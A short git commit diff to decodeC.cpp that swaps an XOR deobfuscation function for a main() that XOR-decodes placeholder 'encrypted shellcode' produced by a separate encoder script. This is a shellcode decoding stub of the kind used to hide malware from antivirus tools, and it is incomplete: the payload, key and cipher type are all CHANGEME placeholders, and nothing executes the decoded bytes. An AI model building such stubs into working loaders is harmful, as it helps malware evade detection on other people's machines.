ca427bd6fefa6ad6acbd0efadc0c39ce661fc13f
0xFlagPlz <59506742+AchocolatechipPancake@users.noreply.github.com>
2022-06-16 08:16:38 -0700

    Update decodeC.cpp

--- decodeC.cpp
+++ decodeC.cpp
@@ -1,16 +1,21 @@
-int unobfus(unsigned char payload[])
-{
-    std::string key;
-    // use the same key as in payload
-    key = "UsugleidIWJWHWQJYsjdhrbe3yujwhhbvdwHST2Ukwu";
-    for (int i = 0; i < payload_len; i++)
-    {
-        char d = payload[i];
-        for (int z = 0; z < key.length(); z++)
-        {
-            d = d ^ (int)key[z];
-        }
-        sense[i] = d;
+int main() {
+    // Encrypted shellcode and cipher key obtained from shellcode_encoder.py
+
+    char encryptedShellcode[] = "CHANGEME";
+    char key[] = "CHANGEME";
+    char cipherType[] = "CHANGEME";
+
+    // Char array to host the deciphered shellcode
+    char shellcode[sizeof encryptedShellcode];
+
+
+    // XOR decoding stub using the key defined above must be the same as the encoding key
+    int j = 0;
+    for (int i = 0; i < sizeof encryptedShellcode; i++) {
+        if (j == sizeof key - 1) j = 0;
+
+        shellcode[i] = encryptedShellcode[i] ^ key[j];
+        j++;
     }
-    return 0;
+
 }
